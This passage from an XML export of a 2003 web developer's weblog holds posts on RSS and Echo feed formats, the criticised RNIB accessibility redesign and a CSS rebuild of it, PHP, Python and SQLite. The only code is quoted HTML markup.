&lt;p&gt;N.B. An issue I haven't touched upon at all is Flash as a tool for serving up &quot;Rich Media Applications&quot;, aka web-based GUIs that provide proper interaction as opposed to the current click-wait-reload cycle provided by &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; forms. I agree that Flash has huge potential here, although I have yet to see an application that really uses this capability to an advantage over more accessible &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. And I won't believe Flash is truly accessible until I can use Flash based web apps from a command line. I'm hard to please like that.&lt;/p&gt;</field>
		<field name="created">2003-06-23 19:21:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1040</field>
		<field name="title">Friends' Blogs</field>
		<field name="slug">friendsBlogs</field>
		<field name="body">&lt;p&gt;My friend Tristan has got his &lt;a href=&quot;http://blog.pyrate.net/&quot; title=&quot;Tristan&amp;apos;s Blog&quot;&gt;blosxom powered blog&lt;/a&gt; up and running again. He's also &lt;a href=&quot;http://blog.pyrate.net/BathBlogs.writeback&quot; title=&quot;Bath Blogs Aggregator&quot;&gt;set up&lt;/a&gt; an experimental &lt;a href=&quot;http://blogs.pyrate.net/&quot;&gt;public aggregator&lt;/a&gt; of feeds from a small group of friends from Uni, using blosxom's companion aggregator blagg. I think public aggregators are going to become a popular end point for &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; in the near future: they're a great way of creating an instant community from existing weblogs. The &lt;a href=&quot;http://mechanicalcat.net/pyblagg.html&quot;&gt;Python Programmer Weblogs&lt;/a&gt; page is a great example of this in action.&lt;/p&gt;

&lt;p&gt;Oh, and &lt;a href=&quot;http://www.radiac.net/&quot;&gt;Richard&lt;/a&gt; finally &lt;a href=&quot;http://www.radiac.net/cgi-bin/diary.pl?command=entry&amp;amp;id=646&quot; title=&quot;It Has Arrived&quot;&gt;got himself a RISC PC&lt;/a&gt;. I think he likes it.&lt;/p&gt;</field>
		<field name="created">2003-06-24 17:41:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1041</field>
		<field name="title">Bruce Eckel on Python as a teaching language</field>
		<field name="slug">pythonTeaching</field>
		<field name="body">&lt;p&gt;From the &lt;a href=&quot;http://www.artima.com/intv/prodperf.html&quot; title=&quot;The Zen of Python: A Conversation with Bruce Eckel, Part II&quot;&gt;latest Artima interview&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.artima.com/intv/prodperf2.html&quot;&gt;
&lt;p&gt;One of the things I find that's remarkable about Python is that it has a very even learning curve. Maybe it's not even a curve, It's kind of a straight line. Learning Python has a zen-like quality, because Python doesn't try to make the world something else. The designers of Java wanted to make the entire world look like a Java virtual machine and the Java libraries. In addition, Java's designers decided that the C++ approach of allowing functions and global variables in addition to classes is bad. So everything in Java has to be declared in a class. For that reason, Utah Valley State College stopped using Java as an introductory language. They actually teach C++ as a first language, because they found it a lot easier.&lt;/p&gt;

&lt;p&gt;Python would make an even better first language to teach programming. It's such a gentle learning curve. You can start with scripts, and of course some people dismiss Python as a scripting language, because you can script with it. You start teaching scripts. You can teach functions. Then later you can add classes. Then you can go onto things like metaclasses. Python has many more of these powerful constructs that you can learn when you're ready. And I think that's very impressive, because it doesn't say you should only be an object-oriented programmer.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-06-24 17:44:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1042</field>
		<field name="title">PHP philosophy, and bundling SQLite</field>
		<field name="slug">philosophy</field>
		<field name="body">&lt;p&gt;Here's a &lt;a href=&quot;http://news.php.net/article.php?group=php.internals&amp;amp;article=2715&quot; title=&quot;Re: enabling sqlite by default&quot;&gt;great quote&lt;/a&gt; from Rasmus Lerdorf (the creator of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;) for people who have become disheartened with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s lack of elegance when compared to other languages such as Python:&lt;/p&gt;

&lt;blockquote cite=&quot;http://news.php.net/article.php?group=php.internals&amp;amp;article=2715&quot;&gt;&lt;p&gt;
PHP has never been just a scripting engine with some
cool add-ons.  PHP has always been the solution to the Web problem with
even more bonus add-ons.  And as I have said so many times, PHP is not
about purity in CS principles or architecture, it is about solving the
ugly web problem with an admittedly ugly, but extremely functional and
convenient solution.  If you are looking for purity you are in the wrong
boat.  Get out now before you get hit by a wet cat!
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I've seen this point of view a few times before, but I've never seen it summarised in quite such a concise way. For me, it brings a lot of common &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; development issues in to perspective.&lt;/p&gt;

&lt;p&gt;Incidentally, Rasmus' comment comes as part of a thread about the bundling of the full SQLite database engine with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;5. I've &lt;a href=&quot;http://simon.incutio.com/archive/2003/03/12/moreLightweightSoftware&quot; title=&quot;More lightweight software&quot;&gt;talked about SQLite&lt;/a&gt; before: it's a remarkably powerful (and fast) relational database engine designed for embedding in other applications. See &lt;a href=&quot;http://www.edwardbear.org/blog/archives/000206.html&quot; title=&quot;Bundling and Enabling SQLite&quot;&gt;Sterling's blog&lt;/a&gt; for more links relating to the conversation.&lt;/p&gt;</field>
		<field name="created">2003-06-24 20:11:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1043</field>
		<field name="title">BBC News Feeds</field>
		<field name="slug">bbcNewsFeeds</field>
		<field name="body">&lt;p&gt;Adrian Holovaty &lt;a href=&quot;http://www.holovaty.com/blog/archive/2003/06/24/1125&quot;&gt;has the scoop&lt;/a&gt; on the &lt;acronym title=&quot;British Broadcasting Corporation&quot;&gt;BBC&lt;/acronym&gt;'s new &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds, one for every news index page of their site. Adrian has also written a bookmarklet to find the feed for any section of the &lt;acronym title=&quot;British Broadcasting Corporation&quot;&gt;BBC&lt;/acronym&gt; site.&lt;/p&gt;</field>
		<field name="created">2003-06-24 20:16:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1044</field>
		<field name="title">RNIB redesign a disappointment</field>
		<field name="slug">rnibDisappointment</field>
		<field name="body">&lt;p&gt;Accessify: &lt;a href=&quot;http://www.accessify.com/archives/2003_06_22_news-archives.asp#105646014644065669&quot;&gt;RNIB redesign does not go far enough&lt;/a&gt; examines the RNIB's much hyped &lt;a href=&quot;http://www.rnib.org.uk/&quot; title=&quot;RNIB Internet HomePage&quot;&gt;new accessible web site&lt;/a&gt; and finds it sorely lacking. While it includes basic accessibility features such as alt attributes and skip-navigation links it suffers hugely from out-dated development practises and unnecessary markup bloat. Here's a prime example, taken from the left hand column of the front page of the site:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;tr&amp;gt;
&amp;lt;td height=&quot;35&quot; valign=&quot;bottom&quot;&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font size=&quot;+1&quot;&amp;gt;&amp;lt;b&amp;gt;&amp;lt;/b&amp;gt; &amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;About Us&amp;lt;br&amp;gt;contents&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;tr&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On further analysis, the front page contains 19 tables, 54 font tags and even an image without an alt attribute. Using tables for layout is not necessarily a barrier to accessibiliy, but I can't imagine navigating through a maze of 19 tables (many of them heavily nested) is much fun for users of specialist software. Forcing the site through the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; validator (it doesn't provide a doctype so I tried using &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; 4 Transitional) produces 84 errors, hinting at a truly flawed underlying site structure.&lt;/p&gt;

&lt;p&gt;Ironically, the &lt;a href=&quot;http://www.rnib.org.uk/xpedio/groups/public/documents/code/public_rnib003460.hcsp&quot;&gt;Good Design&lt;/a&gt; page with advice on designing accessible products is pickled with broken links in any browser other than &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; thanks to \ being used in place of / in the &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s.&lt;/p&gt;

&lt;p&gt;The content management system has some odd side effects as well, such as the bizzare metadata appended to the top of each page:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;
&amp;lt;meta name=&quot;Audience&quot; content=&quot;Webteam - Reserved&quot;&amp;gt;
&amp;lt;meta name=&quot;Audience2&quot; content=&quot;Webteam - Reserved&quot;&amp;gt;
&amp;lt;meta name=&quot;ContentReviewer&quot; content=&quot;enter content reviewer email here (if known)&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It may also be responsible for the strange addition of the word &quot; body&quot; to the end of every page title bar the front page of the site.&lt;/p&gt;

&lt;p&gt;All of this isn't to say the site is bad: the design is nice enough, the accessibility features are way in advance of most commercial web sites and the site content is generally well laid out and well presented. My grips is that it could have been so much &lt;em&gt;more&lt;/em&gt;. The &lt;acronym title=&quot;Royal National Institute for the Blind&quot;&gt;RNIB&lt;/acronym&gt; had a chance to lead by example, following or even helping to establish industry best practises and proving to the world that a site can be accessible, standards compliant and look gorgeous to boot. As it is they've hit one out of three.&lt;/p&gt;</field>
		<field name="created">2003-06-25 01:04:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1045</field>
		<field name="title">Tom Gilder's blog</field>
		<field name="slug">tomGildersBlog</field>
		<field name="body">&lt;p&gt;Tom Gilder has finally &lt;a href=&quot;http://blog.tom.me.uk/&quot; title=&quot;Tom Gilder&amp;apos;s Blog&quot;&gt;started his blog properly&lt;/a&gt;, powered by Moveable Type. Nice design too (be sure to view source to figure out how he achieved the drop shadows). He's already &lt;a href=&quot;http://blog.tom.me.uk/2003/06/20/new_rnib_site.php&quot; title=&quot;New RNIB site&quot;&gt;covered the RNIB site&lt;/a&gt; and has some &lt;a href=&quot;http://blog.tom.me.uk/2003/06/23/ie_conclusionjumping.php&quot; title=&quot;IE Conclusion-Jumping&quot;&gt;refreshing thoughts&lt;/a&gt; on the IE/Windows situation.&lt;/p&gt;</field>
		<field name="created">2003-06-25 01:10:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1046</field>
		<field name="title">More thoughts on RSS</field>
		<field name="slug">moreOnRss</field>
		<field name="body">&lt;p&gt;I helped my girlfriend set up an &lt;a href=&quot;http://blog.natbat.co.uk/rss.php&quot; title=&quot;RSS feeed for NatBat&amp;apos;s Blog&quot;&gt;RSS feed&lt;/a&gt; for her (home brewed) weblog last night. Explaining what &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; was was easy. Explaining what she needed to put in her feed took a little bit longer. All she needed to do was provide a feed of entries, each with a title, the full body of the entry, the date it was posted and a permalink to the archived entry. In working out how to do this, we identified the following steps:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Pick an &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; version, out of &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 0.9x, &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 1.0 or &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 2.0. The 0.9x series was out because there was no way of presenting the date of an entry, so it was between 1.0 and 2.0. 1.0 had all that unnecessary &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; stuff in (is there really a good reason for the &lt;code class=&quot;xml&quot;&gt;&amp;lt;rdf:Seq&amp;gt;&lt;/code&gt; element?) so she went with &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 2.0.&lt;/li&gt;
 &lt;li&gt;Pick a date format, out of &lt;code class=&quot;xml&quot;&gt;&amp;gt;dc:date&amp;lt;&lt;/code&gt; and &lt;code class=&quot;xml&quot;&gt;&amp;lt;pubDate&amp;gt;&lt;/code&gt; (see Mark Pilgrim's &lt;a href=&quot;&quot;&gt;recent entry&lt;/a&gt; for information on the difference). &lt;code class=&quot;xml&quot;&gt;&amp;lt;pubDate&amp;gt;&lt;/code&gt; won on the strength of being part of the core &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 2.0 spec.&lt;/li&gt;
 &lt;li&gt;Pick a way of serving the actual entries, from the following alternatives:
 &lt;ol&gt;
  &lt;li&gt;Entity encoded &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; in the &lt;code class=&quot;xml&quot;&gt;&amp;lt;description&amp;gt;&lt;/code&gt; element.&lt;/li&gt;
  &lt;li&gt;Entity encoded &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; in a &lt;code class=&quot;xml&quot;&gt;&amp;lt;content:encoded&amp;gt;&lt;/code&gt; element.&lt;/li&gt;
  &lt;li&gt;Unencoded &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; in a &lt;code class=&quot;xml&quot;&gt;&amp;lt;body&amp;gt;&lt;/code&gt; element with a namespace.&lt;/li&gt;
 &lt;/ol&gt;
 I advised her to go with the first option as I don't know how good aggregator support for the other two is.&lt;/li&gt;
 &lt;li&gt;Pick a way of providing the permalinks. Up until &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 2.0 this would have been done with the nice and simple &lt;code class=&quot;xml&quot;&gt;&amp;lt;link&amp;gt;&lt;/code&gt; element, but 2.0 introduced the more confusing &lt;code class=&quot;xml&quot;&gt;&amp;lt;guid&amp;gt;&lt;/code&gt; element as well. The &lt;code class=&quot;xml&quot;&gt;&amp;lt;link&amp;gt;&lt;/code&gt; element was chosen as the move obvious of the two.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;It took less time to write the &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; than it did to decide on the elements to use in the feed in the first place. I've been following &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; for a while so I was in a position to guide her through the quagmire, but I can't imagine it would have been much fun working it out without a guide.&lt;/p&gt;

&lt;p&gt;I support the &lt;a href=&quot;http://intertwingly.net/wiki/pie/RoadMap&quot;&gt;Road map for a new format&lt;/a&gt;. Another format may seem like the last thing we need but the current situation is pretty much untenable and forward motion has got to be a good thing. The few concerns I had have been answered by Tim Bray in his &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/06/23/SamsPie&quot; title=&quot;I Like Pie&quot;&gt;latest essay&lt;/a&gt; on the subject.&lt;/p&gt;</field>
		<field name="created">2003-06-25 01:36:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1047</field>
		<field name="title">Moving forward from Internet Explorer</field>
		<field name="slug">movingForward</field>
		<field name="body">&lt;p&gt;Dave Shea is advocating &lt;a href=&quot;http://www.mezzoblue.com/cgi-bin/mt/mezzo/archives/000171.asp&quot; title=&quot;MOSe&quot;&gt;moving forward from Internet Explorer&lt;/a&gt;, enhancing pages for more advanced browsers (Mozilla, Opera, Safari) using additional style rules that are hidden from &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; by using selectors it doesn't understand. Essentially it means adapting the approach we've been taking to Netscape 4 for the past few years to work around flaws in the current browser generation's backwards cousin.&lt;/p&gt;

&lt;p&gt;It's a fun idea, and one I've seen quietly taking off over the past few months in various corners of the web. Naturally, the trick is to only use it for enhancements that would not be missed by the &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; using masses. Sticking to standards compliant enhancements (such as the hover pseudo selector on non-links) is a good idea as well (no matter how tempting Mozilla's curved border support is) as it means that when &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; catches up in 2005 or so its users can enjoy the enhancements as well.&lt;/p&gt;</field>
		<field name="created">2003-06-25 20:44:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1048</field>
		<field name="title">More caching</field>
		<field name="slug">moreCaching</field>
		<field name="body">&lt;p&gt;One of the golden rules of web site development is &quot;never launch a new feature on Friday&quot;, because it's almost certain to break over the weekend while you're not around to fix it. I've just extended my &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/05/cachingWithPHP&quot; title=&quot;Instant caching with PHP&quot;&gt;hacked together caching system&lt;/a&gt; to cover entries as well as the front page in a bid to reduce the load on the database a bit, and since I'm off to Glastonbury tomorrow morning it will have a whole four days in which to collapse in to a smoking hole in the ground. What's the point of golden rules if you don't break them once in a while?&lt;/p&gt;</field>
		<field name="created">2003-06-25 21:27:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1049</field>
		<field name="title">The new RNIB site in CSS</field>
		<field name="slug">RNIBinCSS</field>
		<field name="body">&lt;p&gt;Just to show it can be done, here's the new &lt;acronym title=&quot;Royal National Institute for the Blind&quot;&gt;RNIB&lt;/acronym&gt; site design (as &lt;a href=&quot;http://simon.incutio.com/archive/2003/06/25/rnibDisappointment&quot; title=&quot;RNIB redesign a disappointment&quot;&gt;mentioned earlier&lt;/a&gt;) &lt;a href=&quot;http://simon.incutio.com/code/css/rnib/index.html&quot; title=&quot;RNIB in CSS&quot;&gt;re-done with a CSS layout&lt;/a&gt;. It's something of a first draft - I've only tested it in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6 and Firebird on Windows and it still has a few glitches here and there, but as a proof of concept it works pretty well. Here are a few notes on the implementation:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;p&gt;The demo uses valid &lt;a href=&quot;http://validator.w3.org/check?uri=http%3A%2F%2Fsimon.incutio.com%2Fcode%2Fcss%2Frnib%2Findex.html&quot; title=&quot;W3C Markup Validation Results&quot;&gt;HTML 4.01 Strict&lt;/a&gt; and &lt;a href=&quot;http://jigsaw.w3.org/css-validator/validator?uri=http%3A%2F%2Fsimon.incutio.com%2Fcode%2Fcss%2Frnib%2Findex.html&quot; title=&quot;W3C CSS Validator Results&quot;&gt;CSS 2&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;The demo uses 10 &lt;acronym title=&quot;KiloBytes&quot;&gt;KB&lt;/acronym&gt; of &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; and 4 &lt;acronym title=&quot;KiloBytes&quot;&gt;KB&lt;/acronym&gt; of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. Compare this to the 47 &lt;acronym title=&quot;KiloBytes&quot;&gt;KB&lt;/acronym&gt; of &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; in &lt;a href=&quot;http://www.rnib.org.uk/&quot;&gt;the original page&lt;/a&gt; and the main advantage of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; becomes readily apparent. The demo also uses a few less images as some of the image effects in the original were replaced with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; borders.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;The demo actually works better in Mozilla than the real thing does - several gaps in the design are closed up giving a result that is visually closer to the original as displayed in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;I was forced to use a single layout table for the three news items next to each other. I tried several ways of doing this part of the layout using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; floats, but unfortunately each of them caused a different problem in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6 thanks to bugs in its float implementation. It's probably possible to do this with pure &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and still have it work in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6 but for the moment the table works fine and does nothing to detract from the overall accessibility of the site.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;The background colour in the left and right hand areas does not extend the full length of the document. One potential fix for this is to apply a tiled left background image of a coloured &quot;stripe&quot; to the document body for the right hand area, then apply the same kind of thing to a container div that wraps around the left hand area and the main content div.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;I chose to hide the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; entirely from Netscape 4 using the @import method, as I don't have that browser to hand for testing at the moment. A more comprehensive redesign could include simple style rules to make the site look vaguely interesting in Netscape 4 while more modern browsers got the full layout as the site is meant to look.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;While I've at least ensured that the demo uses labels in all the right places (unlike the real thing), there's plenty of room for improvement on the accessibility front. Tab index and accesskey support would both be worthwhile additions.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All text and images in the demo belong to the &lt;acronym title=&quot;Royal National Institute for the Blind&quot;&gt;RNIB&lt;/acronym&gt;. My markup and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; are in the public domain. Should the &lt;acronym title=&quot;Royal National Institute for the Blind&quot;&gt;RNIB&lt;/acronym&gt; ever decide to move to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; in the future they are more than welcome to use some or all of my work as a starting point.&lt;/p&gt;</field>
		<field name="created">2003-06-25 23:33:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1050</field>
		<field name="title">Off to Glastonbury</field>
		<field name="slug">offToGlastonbury</field>
		<field name="body">&lt;p&gt;I'm off to the &lt;a href=&quot;http://www.glastonbury-festivals.co.uk/&quot;&gt;Glastonbury music festival&lt;/a&gt;. Back Monday.&lt;/p&gt;</field>
		<field name="created">2003-06-26 00:33:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1051</field>
		<field name="title">time_since() on Feedster</field>
		<field name="slug">timeSinceOnFeedster</field>
		<field name="body">&lt;p&gt;This is pretty cool: Scott's taken Nat's &lt;a href=&quot;http://blog.natbat.co.uk/archive/2003/Jun/14/time_since&quot; title=&quot;The time_since() function&quot;&gt;time-since function&lt;/a&gt; and &lt;a href=&quot;http://radio.weblogs.com/0103807/2003/06/26.html#a1823&quot; title=&quot;I Did a Bad Thing and I&amp;apos;m Sorry&quot;&gt;added it to Feedster&lt;/a&gt;, giving a quick indication of how long ago an item was posted.&lt;/p&gt;</field>
		<field name="created">2003-07-01 23:20:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1052</field>
		<field name="title">Join the Buzz</field>
		<field name="slug">artimaBuzz</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.artima.com/&quot;&gt;Artima.com&lt;/a&gt; keeps getting better and better. In addition to the world's most interesting &lt;a href=&quot;http://www.artima.com/weblogs/index.jsp&quot; title=&quot;Artima Weblogs&quot;&gt;collection&lt;/a&gt; of technical bloggers, Bill Venners has just added &lt;a href=&quot;http://www.artima.com/buzz/index.jsp&quot;&gt;Artima Technology Buzz&lt;/a&gt;, a collection of community based public aggregators. They work a bit like the &lt;a href=&quot;http://mechanicalcat.net/pyblagg.html&quot;&gt;Python Programmer Weblogs&lt;/a&gt; page, but covering a wider range of topics and with the important difference that you can add your &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feed up to the relevant community yourself. I've just added some of my &lt;a href=&quot;http://simon.incutio.com/categories/&quot;&gt;category feeds&lt;/a&gt; to the relevant sections - you can add your own site using the links in each section, but you need to register a user account on Artima first.&lt;/p&gt;</field>
		<field name="created">2003-07-01 23:28:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1053</field>
		<field name="title">Further reading on the RNIB redesign</field>
		<field name="slug">moreRNIB</field>
		<field name="body">&lt;p&gt;There's been a flurry of blogger activity concerning the &lt;acronym title=&quot;Royal National Institute for the Blind&quot;&gt;RNIB&lt;/acronym&gt; redesign over the weekend. isolani &lt;a href=&quot;http://www.isolani.co.uk/blog/access/RnibRedesignWebstandardsDisaster&quot; title=&quot;RNIB Redesign - a webstandards disaster&quot;&gt;created an XHTML/CSS redesign&lt;/a&gt; independantly of &lt;a href=&quot;http://simon.incutio.com/archive/2003/06/25/RNIBinCSS&quot; title=&quot;The new RNIB site in CSS&quot;&gt;mine&lt;/a&gt;, while Tom Gilder took mine as a starting point and &lt;a href=&quot;http://blog.tom.me.uk/2003/06/27/rnib_css.php&quot; title=&quot;&quot;&gt;made several improvements&lt;/a&gt;. Ben Meadowcroft has posted an &lt;a href=&quot;http://www.benmeadowcroft.com/me/archive/2003/june.shtml#link26th_1&quot; title=&quot;RNIB open letter (26th June 2003)&quot;&gt;open letter&lt;/a&gt; summarising the concerns felt by him and others over the way the redesign has been implemented. Meanwhile, Julie Howell (the &lt;acronym title=&quot;Royal National Institute for the Blind&quot;&gt;RNIB&lt;/acronym&gt;'s Good Web Design campaign co-ordinator and a well respected member of the Web Accessibility community) has &lt;a href=&quot;http://blog.tom.me.uk/2003/06/20/new_rnib_site.php#comment5&quot;&gt;replied on Tom Gilder's blog&lt;/a&gt; promising to collate feedback and pass it on to the web team (Julie herself was not involved in the redesign). It's good to see they're listening, but I really wish they would hurry up and fix their broken links!&lt;/p&gt;</field>
		<field name="created">2003-07-01 23:51:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1054</field>
		<field name="title">Simple FTP uploading with Python</field>
		<field name="slug">pythonFtp</field>
		<field name="body">&lt;p&gt;Here's a &lt;a href=&quot;http://zephyrfalcon.org/weblog/arch_d7_2003_06_28.html#e262&quot; title=&quot;A simple upload script&quot;&gt;nice example&lt;/a&gt; of a simple Python script which can be bound to the right-click menu in Windows and used to quickly upload files to a specific &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; server.&lt;/p&gt;</field>
		<field name="created">2003-07-01 23:56:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1055</field>
		<field name="title">The Verbosity of Echo</field>
		<field name="slug">theVerbosityOfEcho</field>
		<field name="body">&lt;p&gt;Sam Ruby has &lt;a href=&quot;http://www.intertwingly.net/blog/1506.html&quot; title=&quot;necho 0.1&quot;&gt;called&lt;/a&gt; for people to start experimenting with the current (very early) Echo example feeds, and the response has been pretty impressive; check out these feeds from &lt;a href=&quot;http://www.joelonsoftware.com/echo.xml&quot;&gt;Joel Spolsky&lt;/a&gt;, &lt;a href=&quot;http://philringnalda.com/feed.xml&quot;&gt;Phil Ringnalda&lt;/a&gt; and &lt;a href=&quot;http://diveintomark.org/xml/necho-prototype-20030701.xml&quot;&gt;Mark Pilgrim&lt;/a&gt;. Now that Echo has progressed to a stage where there are concrete feeds to examine, I have some serious concerns over the verbosity of the format. As they stand, Echo feeds contain a lot of duplicated information. Considering that the default behaviour of aggregators is to poll a feed for updates once an hour, any unnecessary information in the feed itself is going to have a very real monetary cost in terms of burnt bandwidth.&lt;/p&gt;

&lt;p&gt;I've posted some further thoughts on this subject in &lt;a href=&quot;http://www.intertwingly.net/blog/1506.html#c1057143717&quot; title=&quot;necho 0.1: comments&quot;&gt;Sam Ruby's comments&lt;/a&gt;, but I think the Echo development community need to spare some thought for the size of the feed. I've seen the justification before that requiring elements rather than making them optional makes it easier to write Echo implementations and I agree that this is a worthwhile consideration, but I think the trade-off in terms of additional bandwidth costs needs to be given a higher priority.&lt;/p&gt;

&lt;p&gt;To that end I've &lt;a href=&quot;http://www.intertwingly.net/wiki/pie/EchoFeedWithAuthorRefs&quot; title=&quot;EchoFeedWithAuthorRefs&quot;&gt;proposed&lt;/a&gt; a small alteration to Echo to remove redundant author information from entries. If you are following the development of Echo I encourage you to take a look.&lt;/p&gt;

&lt;p&gt;On a related note, &lt;a href=&quot;http://www.dehora.net/journal/archives/000313.html&quot; title=&quot;The Echo wiki&quot;&gt;this Java blogger&lt;/a&gt; has some interesting thoughts on the WikiNature (or lack there-of) of the Echo Wiki.&lt;/p&gt;</field>
		<field name="created">2003-07-02 16:24:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1056</field>
		<field name="title">Knowledge Representation Timeline</field>
		<field name="slug">timeline</field>
		<field name="body">&lt;p&gt;This is pretty impressive: A &lt;a href=&quot;http://www.robotwisdom.com/ai/timeline/0000.html&quot;&gt;Timeline of knowledge-representation&lt;/a&gt; that starts at the dawn of the Universe and continues through the whole of human history right up to the present day.&lt;/p&gt;</field>
		<field name="created">2003-07-02 16:27:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1057</field>
		<field name="title">CSS Roundup</field>
		<field name="slug">cssRoundup</field>
		<field name="body">&lt;ul&gt;
 &lt;li&gt;SitePoint are running a &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=116294&quot;&gt;CSS Design Contest&lt;/a&gt;, inspired by the &lt;a href=&quot;http://www.csszengarden.com/&quot;&gt;Zen Garden&lt;/a&gt;.&lt;/li&gt;
